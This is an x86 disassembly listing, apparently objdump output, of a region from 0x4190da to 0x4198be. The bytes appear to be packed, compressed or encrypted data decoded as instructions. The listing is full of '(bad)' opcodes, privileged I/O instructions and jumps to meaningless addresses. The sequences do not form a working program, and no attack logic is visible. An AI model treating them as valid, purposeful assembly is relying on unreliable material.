  4190da:	inc    ebp
  4190db:	jae    0x41911e
  4190dd:	mov    WORD PTR [esi],gs
  4190df:	dec    ebx
  4190e0:	xor    eax,0x6cde2d23
  4190e5:	sbb    ecx,DWORD PTR [edi+0x1fb75c97]
  4190eb:	cmp    ecx,DWORD PTR [edi+0x78f3121a]
  4190f1:	xchg   ecx,eax
  4190f2:	mov    dh,0x67
  4190f4:	jl     0x419109
  4190f6:	fcmovu st,st(5)
  4190f8:	ins    DWORD PTR es:[edi],dx
  4190f9:	inc    eax
  4190fa:	lods   eax,DWORD PTR ds:[esi]
  4190fb:	mov    esi,DWORD PTR [ebx]
  4190fd:	mov    edx,0x99ea475b
  419102:	and    DWORD PTR [ebp+eax*8+0x76],edi
  419106:	mov    ds:0xfc7a4833,eax
  41910b:	mov    bh,0xf9
  41910d:	mov    al,0x11
  41910f:	inc    edi
  419110:	pop    eax
  419111:	mov    eax,0xd116a952
  419116:	cmp    BYTE PTR [edx],dl
  419118:	fwait
  419119:	sub    ebp,esp
  41911b:	out    0x9b,al
  41911d:	std    
  41911e:	lds    ebp,FWORD PTR [ebx-0x5d]
  419121:	imul   edi,DWORD PTR [esp+edx*4-0x55ad11c0],0xffffffef
  419129:	cmp    edx,edx
  41912b:	jg     0x41916a
  41912d:	xor    ebx,eax
  41912f:	jo     0x4190f4
  419131:	pop    ebp
  419132:	cwde   
  419133:	repz xlat BYTE PTR ds:[ebx]
  419135:	test   eax,0xea2c4ad2
  41913a:	fst    QWORD PTR [esi]
  41913c:	gs xchg esi,eax
  41913e:	add    DWORD PTR [edi-0x73],0xffffffa8
  419142:	jb     0x419176
  419144:	jbe    0x4190d1
  419146:	adc    eax,0x7b806fc
  41914b:	mov    dh,0xa0
  41914d:	mov    esp,0x48224885
  419152:	or     al,0xc2
  419154:	cmp    BYTE PTR [ebp-0x1e2e7b7f],bl
  41915a:	xor    al,0x3b
  41915c:	sar    DWORD PTR [ecx-0x28],cl
  41915f:	rcl    DWORD PTR [ebp+0x370b18a7],cl
  419165:	mov    edx,DWORD PTR [eax+0x51b81cca]
  41916b:	iret   
  41916c:	enter  0x4dac,0xa3
  419170:	scas   al,BYTE PTR es:[edi]
  419171:	add    al,0xde
  419173:	jmp    0x419181
  419175:	addr16 add eax,0x7d497390
  41917b:	sub    DWORD PTR [eax+0x5e],ecx
  41917e:	dec    eax
  41917f:	push   0xb4060870
  419184:	cmp    ah,BYTE PTR [esi-0x6cc2bcb1]
  41918a:	xor    cl,0xba
  41918d:	(bad)  
  41918e:	or     al,0xa0
  419190:	call   0x47552cc6
  419195:	rcr    DWORD PTR [ebp-0x3db2c48f],0x34
  41919c:	pop    edi
  41919d:	pop    ebp
  41919e:	jno    0x419157
  4191a0:	dec    esp
  4191a1:	dec    BYTE PTR ds:0x8c2e6f9f
  4191a7:	push   dx
  4191a9:	in     eax,0xa3
  4191ab:	and    ah,BYTE PTR [ecx+0x4d]
  4191ae:	out    0xee,eax
  4191b0:	and    DWORD PTR [eax+0xede3b41],ecx
  4191b6:	cdq    
  4191b7:	xchg   edi,eax
  4191b8:	lahf   
  4191b9:	das    
  4191ba:	(bad)  
  4191bb:	push   0x22
  4191bd:	ret    
  4191be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191bf:	adc    edx,DWORD PTR [ebx]
  4191c1:	cdq    
  4191c2:	stos   BYTE PTR es:[edi],al
  4191c3:	lock adc eax,0xe798ab1e
  4191c9:	popa   
  4191ca:	mov    al,0xa8
  4191cc:	test   BYTE PTR [ecx-0x7d],ch
  4191cf:	pop    esp
  4191d0:	shl    DWORD PTR [esi+edi*2+0x64aac6b],0x34
  4191d8:	push   ecx
  4191d9:	cmc    
  4191da:	adc    al,0x30
  4191dc:	(bad)  
  4191dd:	and    BYTE PTR [esi],ah
  4191df:	pop    es
  4191e0:	(bad)  
  4191e1:	hlt    
  4191e2:	xchg   DWORD PTR [eax],edi
  4191e4:	into   
  4191e5:	sub    bl,BYTE PTR [ebp-0x5d7dcedb]
  4191eb:	mov    esi,DWORD PTR [ebp-0x335b64c6]
  4191f1:	imul   esi,edi,0xa
  4191f4:	sahf   
  4191f5:	sbb    edx,DWORD PTR [ecx+eiz*2+0x13be5a54]
  4191fc:	loope  0x41925f
  4191fe:	test   DWORD PTR [ecx+0x17],0x359821a3
  419205:	jb     0x4191c1
  419207:	adc    al,0x8e
  419209:	dec    ebx
  41920a:	dec    edi
  41920b:	cs cmp edx,esi
  41920e:	or     al,0x4b
  419210:	aam    0x59
  419212:	fsub   st(2),st
  419214:	pop    ebp
  419215:	es xchg bl,dl
  419218:	mov    al,ds:0x913dc476
  41921d:	pop    edx
  41921e:	push   esi
  41921f:	or     BYTE PTR [edx-0xd],dl
  419222:	mov    bl,0xa7
  419224:	data16 stos BYTE PTR es:[edi],al
  419226:	out    dx,eax
  419227:	aam    0xaa
  419229:	out    0x42,eax
  41922b:	fnsave [edi+0x24b4b7e1]
  419231:	pop    esp
  419232:	cmp    eax,0x51b1f703
  419237:	jne    0x4191be
  419239:	pop    ebp
  41923a:	push   0x2ed0424f
  41923f:	add    eax,0x1126610d
  419244:	mov    bh,0x8b
  419246:	int3   
  419247:	push   0xffffff92
  419249:	inc    esi
  41924a:	sub    eax,0x39fb6747
  41924f:	push   edx
  419250:	dec    ecx
  419251:	scas   al,BYTE PTR es:[edi]
  419252:	stos   BYTE PTR es:[edi],al
  419253:	mov    BYTE PTR [esi],cl
  419255:	pop    ss
  419256:	pop    eax
  419257:	adc    DWORD PTR [ebx],ebx
  419259:	int3   
  41925a:	mov    al,0x70
  41925c:	scas   eax,DWORD PTR es:[edi]
  41925d:	retf   0xf354
  419260:	add    BYTE PTR [eax],al
  419262:	add    BYTE PTR [eax],al
  419264:	add    BYTE PTR [eax],al
  419266:	adc    eax,0x773f6240
  41926b:	aas    
  41926c:	pop    ebp
  41926d:	push   0xffffff86
  41926f:	jb     0x4192d3
  419271:	stc    
  419272:	dec    DWORD PTR [eax-0x734e017b]
  419278:	add    DWORD PTR [eax],eax
  41927a:	and    al,BYTE PTR [edi]
  41927c:	add    BYTE PTR [eax],al
  41927e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927f:	and    BYTE PTR [esp+eiz*4+0x601ff7ef],ah
  419286:	dec    eax
  419287:	jmp    0x54c1:0x17ee5145
  41928e:	inc    esp
  41928f:	(bad)  
  419290:	loopne 0x4192fa
  419292:	ins    BYTE PTR es:[edi],dx
  419293:	jge    0x419236
  419295:	sti    
  419296:	mov    edx,DWORD PTR [edx+0x3c813ff7]
  41929c:	adc    BYTE PTR [ecx],dl
  41929e:	sbb    al,0x78
  4192a0:	xchg   BYTE PTR ds:0xe3deffc7,ch
  4192a6:	mov    DWORD PTR [esi],edi
  4192a8:	(bad)  
  4192a9:	push   edi
  4192aa:	mov    ebp,0xf0e7a95d
  4192af:	cli    
  4192b0:	stos   DWORD PTR es:[edi],eax
  4192b1:	inc    BYTE PTR [ebx]
  4192b3:	mov    edi,0x382867aa
  4192b8:	cmp    DWORD PTR [edi],ebx
  4192ba:	daa    
  4192bb:	push   edi
  4192bc:	cmp    DWORD PTR [ebx+eiz*8+0x58694669],esi
  4192c3:	add    al,0xaf
  4192c5:	sti    
  4192c6:	es pusha 
  4192c8:	mov    al,ds:0x2927321
  4192cd:	cmp    eax,0xc5730aac
  4192d2:	jb     0x41934a
  4192d4:	jne    0x419321
  4192d6:	jp     0x4192ff
  4192d8:	lea    esi,[esp+esi*2-0x51]
  4192dc:	outs   dx,WORD PTR ds:[esi]
  4192de:	ret    
  4192df:	cmc    
  4192e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192e1:	je     0x4192e4
  4192e3:	and    edi,DWORD PTR ds:0x254f53d6
  4192e9:	pop    esi
  4192ea:	push   ecx
  4192eb:	std    
  4192ec:	lds    ebp,FWORD PTR [edx-0x75]
  4192ef:	xchg   DWORD PTR [ecx+0x3215a0eb],ebp
  4192f5:	xor    edi,DWORD PTR [edi-0x61b15321]
  4192fb:	out    0x67,eax
  4192fd:	push   esi
  4192fe:	fidiv  WORD PTR [ecx+0x7a73ee28]
  419304:	out    0xbf,al
  419306:	sub    DWORD PTR [esi],ecx
  419308:	sub    eax,0xaf7f9365
  41930d:	popa   
  41930e:	sar    BYTE PTR [esi-0x59],0xe7
  419312:	sub    dl,ah
  419314:	fimul  WORD PTR [esi-0x7f]
  419317:	shl    DWORD PTR [esi-0x4471af17],1
  41931d:	ret    
  41931e:	or     bh,BYTE PTR [esi]
  419320:	shl    DWORD PTR [esi-0x4b80a1ed],1
  419326:	vmwrite edx,DWORD PTR [esi+0x477b7fd7]
  41932d:	sar    BYTE PTR [ebp-0x1b],1
  419330:	pop    ds
  419331:	push   cs
  419332:	jg     0x419311
  419334:	lods   al,BYTE PTR ds:[esi]
  419335:	xor    al,0x63
  419337:	xchg   esi,eax
  419338:	retf   0x813
  41933b:	sahf   
  41933c:	sub    ebx,DWORD PTR [ecx-0x79]
  41933f:	ins    BYTE PTR es:[edi],dx
  419340:	sti    
  419341:	xchg   esp,eax
  419342:	xchg   edi,eax
  419343:	inc    ebx
  419344:	test   eax,0x3015b2a9
  419349:	add    eax,0xb92e177a
  41934e:	xchg   esp,eax
  41934f:	ds (bad) 
  419351:	pop    edx
  419352:	cld    
  419353:	xchg   ecx,eax
  419354:	fisttp DWORD PTR [ecx-0x34]
  419357:	xor    eax,DWORD PTR [edi+0x918ef54]
  41935d:	loope  0x4193cc
  41935f:	push   eax
  419360:	call   0x6652:0x9924f37a
  419367:	sbb    BYTE PTR [ecx-0x7d15a8d8],cl
  41936d:	xor    DWORD PTR [ebp+0x52543401],edi
  419373:	fdiv   DWORD PTR [ecx+eiz*1]
  419376:	ds cmp eax,0xae225a97
  41937c:	ins    DWORD PTR es:[edi],dx
  41937d:	sbb    eax,DWORD PTR [ebx-0x1]
  419380:	cld    
  419381:	pop    eax
  419382:	push   esp
  419383:	int    0x65
  419385:	xchg   esi,eax
  419386:	gs retf 0x5342
  41938a:	mov    al,0x7c
  41938c:	push   ebx
  41938d:	and    bh,dl
  41938f:	push   ds
  419390:	call   0xfb3e180a
  419395:	in     al,0x12
  419397:	std    
  419398:	push   es
  419399:	mov    ebx,edi
  41939b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41939c:	into   
  41939d:	and    DWORD PTR [esi+0x47],edi
  4193a0:	add    esp,DWORD PTR [esi-0x12]
  4193a3:	test   eax,0x84aca71e
  4193a8:	dec    eax
  4193a9:	and    bl,BYTE PTR [eax-0x4c42cea0]
  4193af:	rcl    DWORD PTR [ecx-0x665a1b85],0x89
  4193b6:	in     eax,0x50
  4193b8:	shl    BYTE PTR [ebx],1
  4193ba:	je     0x4193a6
  4193bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193bd:	xchg   DWORD PTR ss:[edx],eax
  4193c0:	stos   BYTE PTR es:[edi],al
  4193c1:	test   eax,0x82ce2b90
  4193c6:	inc    ebp
  4193c7:	fs cmp bh,bh
  4193ca:	push   ebp
  4193cb:	lds    edx,FWORD PTR [ecx]
  4193cd:	cli    
  4193ce:	scas   al,BYTE PTR es:[edi]
  4193cf:	push   edx
  4193d0:	rcr    DWORD PTR [esi],1
  4193d2:	or     DWORD PTR [edi],esi
  4193d4:	scas   ax,WORD PTR es:[edi]
  4193d6:	repz or ebp,DWORD PTR [edx+0x17]
  4193da:	enter  0xd783,0x3c
  4193de:	loope  0x419428
  4193e0:	fadd   DWORD PTR [edi-0x6794a2d3]
  4193e6:	dec    ecx
  4193e7:	dec    edi
  4193e8:	push   es
  4193e9:	ja     0x4193fd
  4193eb:	outs   dx,DWORD PTR ss:[esi]
  4193ed:	stc    
  4193ee:	(bad)  
  4193ef:	mov    ds:0x3da2168b,al
  4193f4:	cmc    
  4193f5:	clc    
  4193f6:	push   es
  4193f7:	lea    ebp,[edi]
  4193f9:	mov    esp,0xda85767b
  4193fe:	(bad)  
  4193ff:	mov    ecx,0x87d539f8
  419404:	dec    DWORD PTR [eax-0x45]
  419407:	sahf   
  419408:	retf   
  419409:	retf   
  41940a:	aam    0xe0
  41940c:	call   0xfd8c:0xafe3c61e
  419413:	daa    
  419414:	adc    BYTE PTR [esi-0x4b37806b],bl
  41941a:	xchg   esi,eax
  41941b:	adc    BYTE PTR [ecx],dh
  41941d:	inc    edx
  41941e:	adc    DWORD PTR [ebx+0x7d],edx
  419421:	xchg   esi,eax
  419422:	(bad)  
  419424:	or     BYTE PTR [edx-0x14],dl
  419427:	daa    
  419428:	lahf   
  419429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41942a:	std    
  41942b:	jge    0x4193c1
  41942d:	std    
  41942e:	nop
  41942f:	fld    TBYTE PTR [esi-0x40045638]
  419435:	mov    bh,ah
  419437:	ds retf 
  419439:	imul   edx,edi,0x43
  41943c:	xchg   esp,eax
  41943d:	cmp    edx,DWORD PTR [esi+0x69afb312]
  419443:	les    edi,FWORD PTR [ecx]
  419445:	dec    edi
  419446:	mov    si,0xd939
  41944a:	(bad)  
  41944b:	dec    edx
  41944c:	pop    ds
  41944d:	mov    ebx,0x62b2994a
  419452:	pop    ds
  419453:	inc    ebp
  419454:	dec    ebx
  419455:	sub    ch,BYTE PTR ds:0x47e18a0
  41945b:	aam    0x82
  41945d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41945e:	xor    edi,edi
  419460:	mov    dl,0x23
  419462:	jl     0x41941e
  419464:	mov    ebp,DWORD PTR [ebx-0x1a029c54]
  41946a:	xchg   edx,eax
  41946b:	dec    ebp
  41946c:	fs adc al,0xda
  41946f:	inc    esi
  419470:	sub    eax,0xa64af19f
  419475:	add    BYTE PTR [edi+eax*4-0x4b],ah
  419479:	retf   0x4f60
  41947c:	jp     0x4194c8
  41947e:	inc    esi
  41947f:	xor    BYTE PTR [ebx],bl
  419481:	outs   dx,DWORD PTR ds:[esi]
  419482:	pop    esp
  419483:	daa    
  419484:	push   ebp
  419485:	dec    edi
  419486:	lahf   
  419487:	cld    
  419488:	fiadd  WORD PTR [ebx+0x6f]
  41948b:	lahf   
  41948c:	ja     0x41944e
  41948e:	mov    cl,0x1b
  419490:	jns    0x419432
  419492:	sbb    cl,bh
  419494:	out    dx,eax
  419495:	xchg   esi,eax
  419496:	sar    esp,cl
  419498:	retf   
  419499:	sub    DWORD PTR [ebx],esi
  41949b:	in     al,dx
  41949c:	mov    ah,BYTE PTR [eax-0x6908b0aa]
  4194a2:	sbb    DWORD PTR [ebp+0x1d],0x33
  4194a6:	mov    ds:0xb54c6c43,al
  4194ab:	ins    BYTE PTR es:[edi],dx
  4194ac:	lods   al,BYTE PTR ds:[esi]
  4194ad:	retf   0x6aa7
  4194b0:	pop    ss
  4194b1:	or     DWORD PTR [ebx],edi
  4194b3:	clts   
  4194b5:	mov    eax,ds:0x70dfef5
  4194ba:	mov    esp,0xd15d7d7d
  4194bf:	and    DWORD PTR [ebp+0x75d16568],ecx
  4194c5:	pop    es
  4194c6:	mov    ebx,0xb1bceb98
  4194cb:	sub    al,0xa4
  4194cd:	inc    ecx
  4194ce:	sbb    al,0xee
  4194d0:	xchg   esi,eax
  4194d1:	out    dx,al
  4194d2:	enter  0xe522,0xae
  4194d6:	jne    0x41945a
  4194d8:	pop    es
  4194d9:	mov    WORD PTR [edi],gs
  4194db:	push   ebp
  4194dc:	and    DWORD PTR [ecx],eax
  4194de:	mov    al,ds:0x8bd812a9
  4194e3:	mov    ds:0x88ec087c,eax
  4194e8:	test   eax,0xd78592a3
  4194ed:	shr    BYTE PTR ds:0x3da3af85,0x42
  4194f4:	pop    ecx
  4194f5:	jb     0x4194e3
  4194f7:	pop    ebp
  4194f8:	adc    bl,BYTE PTR [esi-0xa]
  4194fb:	pop    esi
  4194fc:	dec    ecx
  4194fd:	je     0x4194ad
  4194ff:	jne    0x419573
  419501:	cs popf 
  419503:	or     ch,BYTE PTR [esi]
  419505:	leave  
  419506:	and    ecx,DWORD PTR [esi-0x65049853]
  41950c:	sub    DWORD PTR ss:0x874a6aee,ecx
  419513:	mov    WORD PTR [esi+edi*2+0x1d],ds
  419517:	call   0xc8371a8b
  41951c:	mov    DWORD PTR [edx+0x2e],ecx
  41951f:	pop    esp
  419520:	xor    eax,0x2e4b0531
  419525:	out    0x2f,al
  419527:	mov    ds:0x7e9ecc32,eax
  41952c:	xchg   esp,eax
  41952d:	or     al,0xf6
  41952f:	pop    ss
  419530:	xchg   ebx,eax
  419531:	sahf   
  419532:	mov    eax,ds:0xdae90d0c
  419537:	test   BYTE PTR [esi],dh
  419539:	xchg   edi,eax
  41953a:	mov    DWORD PTR [edx+0x70],ecx
  41953d:	xor    DWORD PTR [eax],esp
  41953f:	int3   
  419540:	out    0xa6,eax
  419542:	sbb    al,0x6c
  419544:	sub    DWORD PTR [ebx+0xf],ecx
  419547:	jg     0x419532
  419549:	add    BYTE PTR [ebx],dh
  41954b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41954d:	cdq    
  41954e:	data16 sti 
  419550:	cmc    
  419551:	fucomp st(6)
  419553:	cdq    
  419554:	lods   eax,DWORD PTR ds:[esi]
  419555:	jmp    0x4195a4
  419557:	pop    eax
  419558:	fadd   QWORD PTR [edx+0x50]
  41955b:	mov    gs,WORD PTR [ebp-0x45]
  41955e:	fst    DWORD PTR [ecx+0x70ac1707]
  419564:	dec    esi
  419565:	push   0x6ee62c57
  41956a:	xlat   BYTE PTR ds:[ebx]
  41956b:	gs sahf 
  41956d:	ja     0x419537
  41956f:	(bad)  
  419570:	sahf   
  419571:	pop    ebx
  419572:	mov    dh,0xe6
  419574:	xchg   esp,eax
  419575:	push   eax
  419576:	sahf   
  419577:	add    al,0x7
  419579:	xor    BYTE PTR [edx-0x76],dl
  41957c:	xchg   edi,eax
  41957d:	add    esp,ecx
  41957f:	mov    ds:0x64a20990,eax
  419584:	pusha  
  419585:	xor    al,0xdd
  419587:	shl    DWORD PTR [edi],0x55
  41958a:	pop    ss
  41958b:	hlt    
  41958c:	out    0x48,eax
  41958e:	div    BYTE PTR [ebp+ecx*1+0x2afa2b19]
  419595:	push   ss
  419596:	or     eax,0x877a53f9
  41959b:	rcl    BYTE PTR [edi],cl
  41959d:	sbb    ebp,0xd5c2a13f
  4195a3:	cmp    BYTE PTR [ecx-0x4f],cl
  4195a6:	jge    0x4195de
  4195a8:	fcmovb st,st(7)
  4195aa:	sub    esp,DWORD PTR [eax+0x47]
  4195ad:	into   
  4195ae:	mov    edx,0x4f5e068f
  4195b3:	push   esp
  4195b4:	pushf  
  4195b5:	stc    
  4195b6:	cli    
  4195b7:	pushf  
  4195b8:	popa   
  4195b9:	cmc    
  4195ba:	imul   ecx,ebp,0x64
  4195bd:	sbb    ch,BYTE PTR [eax+0x3e041781]
  4195c3:	xchg   ebx,eax
  4195c4:	xchg   ebp,eax
  4195c5:	jbe    0x4195c1
  4195c7:	mov    eax,0x5c6bb279
  4195cc:	adc    ebp,DWORD PTR [ebp-0x6d32fede]
  4195d2:	and    bh,cl
  4195d4:	(bad)  
  4195d5:	in     eax,0x86
  4195d7:	push   edi
  4195d8:	aaa    
  4195d9:	je     0x419566
  4195db:	adc    BYTE PTR [ecx+0x146ad749],ch
  4195e1:	out    dx,eax
  4195e2:	adc    BYTE PTR [edx-0x5766ee11],dl
  4195e8:	mov    ch,0x84
  4195ea:	shr    BYTE PTR [ebx],cl
  4195ec:	fsubp  st(4),st
  4195ee:	ja     0x4195cc
  4195f0:	pop    ebp
  4195f1:	and    BYTE PTR [edi],bh
  4195f3:	ret    0xaf20
  4195f6:	fcom   QWORD PTR [ebx-0x3b]
  4195f9:	cmp    ebp,DWORD PTR [esi-0x19]
  4195fc:	enter  0xf1b7,0x41
  419600:	leave  
  419601:	dec    eax
  419602:	out    0x9c,al
  419604:	and    al,0x38
  419606:	mov    esp,0xb0c2b3e9
  41960b:	cmp    dl,bl
  41960d:	sub    DWORD PTR [edi+0x7a9afec7],0x79
  419614:	adc    DWORD PTR [ebp+0x26c2cd04],ecx
  41961a:	push   ss
  41961b:	enter  0x3633,0xb9
  41961f:	inc    ebx
  419620:	je     0x419604
  419622:	sbb    al,0x36
  419624:	imul   ebp,DWORD PTR [ecx+ebx*1],0xb90cefd9
  41962b:	loopne 0x419668
  41962d:	mov    ebp,0x6c52d1ac
  419632:	ffreep st(6)
  419634:	sbb    DWORD PTR [ebp-0x19cbb7ab],eax
  41963a:	pop    edi
  41963b:	lahf   
  41963c:	sbb    eax,eax
  41963e:	imul   esp,ebp,0xffffffdd
  419641:	jg     0x419698
  419643:	add    dl,ah
  419645:	and    al,0x66
  419647:	mov    edx,0xfdb2f22f
  41964c:	push   0x1b
  41964e:	je     0x419625
  419650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419651:	add    ecx,ecx
  419653:	ja     0x419667
  419655:	pop    esp
  419656:	es xchg edi,eax
  419658:	fistp  QWORD PTR ds:0xd15c979d
  41965e:	out    dx,eax
  41965f:	sti    
  419660:	xchg   BYTE PTR [ecx],dh
  419662:	data16 outs dx,BYTE PTR ds:[si]
  419665:	mov    al,ah
  419667:	adc    al,BYTE PTR [eax]
  419669:	add    dl,0xe2
  41966c:	sbb    DWORD PTR [esi],ebx
  41966e:	sbb    bh,BYTE PTR [esi]
  419670:	pop    ss
  419671:	movups xmm4,XMMWORD PTR [ecx-0x51]
  419675:	icebp  
  419676:	stos   DWORD PTR es:[edi],eax
  419677:	pop    esi
  419678:	mov    eax,ds:0xabb8721f
  41967d:	mov    ds:0x36b7a21c,al
  419682:	cld    
  419683:	test   eax,0x4d41cf08
  419688:	jnp    0x41969e
  41968a:	(bad)  
  41968b:	bound  ecx,QWORD PTR [edi]
  41968d:	es sub ch,ah
  419690:	sbb    DWORD PTR ds:0x834c8757,0x25
  419697:	loopne 0x41970b
  419699:	and    edi,ebx
  41969b:	mov    bh,0x65
  41969d:	fdiv   DWORD PTR [ecx]
  41969f:	into   
  4196a0:	call   ecx
  4196a2:	sub    dh,BYTE PTR ds:0xd6a7a5a6
  4196a8:	inc    eax
  4196a9:	push   edi
  4196aa:	sub    al,BYTE PTR [esi-0x2f]
  4196ad:	push   ds
  4196ae:	pop    edi
  4196af:	retf   0x1a30
  4196b2:	outs   dx,BYTE PTR ds:[esi]
  4196b3:	jbe    0x419692
  4196b5:	sbb    ebp,esp
  4196b7:	aaa    
  4196b8:	pusha  
  4196b9:	jb     0x4196cc
  4196bb:	cli    
  4196bc:	je     0x419715
  4196be:	loopne 0x419704
  4196c0:	enter  0x4975,0xe8
  4196c4:	push   edx
  4196c5:	ss call 0xd59a7b7c
  4196cb:	js     0x419726
  4196cd:	mov    esi,0x4c93a338
  4196d2:	inc    edx
  4196d3:	mov    esi,0x5cb3b122
  4196d8:	push   ss
  4196d9:	mov    ds:0x22d115b7,eax
  4196de:	mov    esp,0x62827c04
  4196e3:	xor    al,0xfe
  4196e5:	loopne 0x419744
  4196e7:	sub    DWORD PTR [eax],edx
  4196e9:	loopne 0x41970a
  4196eb:	push   eax
  4196ec:	xor    al,0xe1
  4196ee:	fisubr WORD PTR [esi]
  4196f0:	sbb    eax,0xe1c29fcd
  4196f5:	out    dx,al
  4196f6:	and    edx,0x61
  4196f9:	std    
  4196fa:	pop    esp
  4196fb:	cmp    al,0x44
  4196fd:	(bad)  
  4196fe:	mov    bl,0xab
  419700:	jp     0x41969f
  419702:	in     eax,dx
  419703:	or     al,BYTE PTR [ebp+ebp*4+0x72]
  419707:	xchg   ecx,eax
  419708:	clc    
  419709:	inc    esp
  41970a:	(bad)  
  41970b:	jmp    0x252:0x5667b9f
  419712:	sub    ebp,DWORD PTR [ebx-0xc50e79e]
  419718:	imul   esp,DWORD PTR [ebp-0x5e],0xe226ba9d
  41971f:	loopne 0x41970f
  419721:	gs pusha 
  419723:	and    al,0x4d
  419726:	fisub  DWORD PTR [ebx-0x51df8fb0]
  41972c:	mov    ah,0x14
  41972e:	test   al,0x41
  419730:	inc    esp
  419731:	sar    DWORD PTR [edx],0x4e
  419734:	push   ebx
  419735:	push   DWORD PTR [esi]
  419737:	pop    eax
  419738:	mov    ch,0x6f
  41973a:	xor    esp,esi
  41973c:	inc    esp
  41973d:	sbb    bl,ah
  41973f:	in     al,dx
  419740:	adc    ah,ah
  419742:	stc    
  419743:	rcr    DWORD PTR [esi],1
  419745:	xchg   BYTE PTR [eax-0x1cbb4008],al
  41974b:	adc    DWORD PTR [eax+ebp*8],0x3cd3834
  419752:	loope  0x419767
  419754:	xchg   DWORD PTR [edx],edx
  419756:	je     0x4197a2
  419758:	and    DWORD PTR [edi-0x38ae3fd3],0x43bd45d1
  419762:	or     ch,ch
  419764:	xchg   ecx,eax
  419765:	jo     0x41972d
  419767:	and    DWORD PTR [edi],edx
  419769:	shr    BYTE PTR [ebp+0x2d333dba],cl
  41976f:	add    esp,esp
  419771:	mov    ecx,ecx
  419773:	or     ebp,esi
  419775:	jmp    0x9c20:0x8186bd1e
  41977c:	sub    cl,0xfa
  41977f:	jl     0x41973f
  419781:	mov    ds:0x20d79ae0,al
  419786:	fmul   DWORD PTR [eax+0x71]
  419789:	push   ebp
  41978a:	cld    
  41978b:	ror    ch,cl
  41978d:	sbb    BYTE PTR [esi],0xdb
  419790:	leave  
  419791:	stos   DWORD PTR es:[edi],eax
  419792:	pcmpgtb mm2,QWORD PTR [edi]
  419795:	mov    dh,0x7e
  419797:	dec    esp
  419798:	inc    ebp
  419799:	aas    
  41979a:	es in  al,0x42
  41979d:	and    BYTE PTR [edx-0x34],al
  4197a0:	iret   
  4197a1:	and    al,0x46
  4197a3:	lahf   
  4197a4:	jae    0x419825
  4197a6:	xor    BYTE PTR [eax+0x7f],ah
  4197a9:	ss push es
  4197ab:	cmp    eax,0x8f187605
  4197b0:	dec    edi
  4197b1:	sub    al,0xb0
  4197b3:	fs dec esp
  4197b5:	fs mov ebx,0x5d64496b
  4197bb:	pop    eax
  4197bd:	add    al,0x5d
  4197bf:	sbb    al,BYTE PTR [ecx-0x4ebb6831]
  4197c5:	push   esp
  4197c6:	fsubr  DWORD PTR [eax-0x5a]
  4197c9:	out    dx,eax
  4197ca:	int    0x70
  4197cc:	ja     0x4197bc
  4197ce:	or     esi,ecx
  4197d0:	jnp    0x4197d6
  4197d2:	push   eax
  4197d3:	call   0xf8d399f8
  4197d8:	xchg   DWORD PTR [edx],edi
  4197da:	ja     0x4197b9
  4197dc:	mov    ecx,0xe6fbba3c
  4197e1:	mov    DWORD PTR [eax-0x326fdbab],0x4dbf3059
  4197eb:	addr16 call 0xa0aac810
  4197f1:	mov    fs,edx
  4197f3:	stos   BYTE PTR es:[edi],al
  4197f4:	call   0x8bf88956
  4197f9:	daa    
  4197fa:	push   esp
  4197fb:	sar    DWORD PTR [ebp-0x4e32ada6],1
  419801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419802:	cmc    
  419803:	or     al,0x2c
  419805:	cwde   
  419806:	int    0x69
  419808:	mov    ecx,0xdd9fada7
  41980d:	inc    edi
  41980e:	not    BYTE PTR [esi]
  419810:	retf   0x2df6
  419813:	sbb    edi,DWORD PTR [ebx+ebx*1+0x780f6bcb]
  41981a:	jnp    0x419867
  41981c:	add    BYTE PTR fs:[edi],bl
  41981f:	pop    ds
  419820:	mov    al,al
  419822:	jo     0x41989e
  419824:	add    BYTE PTR [ebx+0x71],bh
  419827:	jae    0x4197f9
  419829:	cld    
  41982a:	pop    esi
  41982b:	mov    WORD PTR [edi],ss
  41982d:	jle    0x41984a
  41982f:	leave  
  419830:	dec    ebp
  419831:	lds    esp,FWORD PTR [ecx]
  419833:	cmp    al,0x82
  419835:	in     eax,dx
  419836:	sahf   
  419837:	mov    al,0x16
  419839:	data16 fst QWORD PTR es:[ebx]
  41983d:	jns    0x41987a
  41983f:	pop    esi
  419840:	jbe    0x4198b1
  419842:	sub    bl,cl
  419844:	mov    dh,0x6d
  419846:	(bad)  
  419847:	sub    edx,eax
  419849:	mov    al,0x5f
  41984b:	mov    ds:0x48a3e56c,al
  419850:	mov    bl,0x3c
  419852:	jge    0x4197fd
  419854:	data16 jmp 0x4198ba
  419857:	jl     0x4198af
  419859:	stos   DWORD PTR es:[edi],eax
  41985a:	jge    0x4198c2
  41985c:	adc    al,0x49
  41985e:	stc    
  41985f:	in     eax,0xfd
  419861:	ficom  WORD PTR [ecx-0x24]
  419864:	je     0x419819
  419866:	rol    esi,cl
  419868:	sbb    al,0xd1
  41986a:	mov    edx,0xfb0f594b
  41986f:	pop    esi
  419870:	jle    0x4198e2
  419872:	popf   
  419873:	sub    ah,BYTE PTR [edx+0x7d0ac489]
  419879:	sub    dh,BYTE PTR [esi-0x8]
  41987c:	push   ebx
  41987d:	popa   
  41987e:	lahf   
  41987f:	cmp    cl,0xc2
  419882:	(bad)  
  419883:	push   edx
  419884:	jmp    0x796e:0xb72e891f
  41988b:	mov    ds:0xe1839213,eax
  419890:	je     0x419850
  419892:	and    eax,0x7a56f12c
  419897:	xchg   BYTE PTR [ebx+0x7d],dl
  41989a:	pop    ebp
  41989b:	xchg   esp,eax
  41989c:	add    DWORD PTR [esi+0x6b661ff5],esi
  4198a2:	stc    
  4198a3:	retf   
  4198a4:	nop    DWORD PTR [ebp+0x5f]
  4198a8:	push   esp
  4198a9:	rcr    DWORD PTR [esi+0x71d792e7],1
  4198af:	aaa    
  4198b0:	dec    ebx
  4198b1:	add    DWORD PTR [ebp-0x4e],0xb2ea512e
  4198b8:	fild   QWORD PTR [ebx-0x4b]
  4198bb:	xor    edx,edi
  4198bd:	inc    esi
  4198be:	and    edi,DWORD PTR [esi-0x9cfb621]
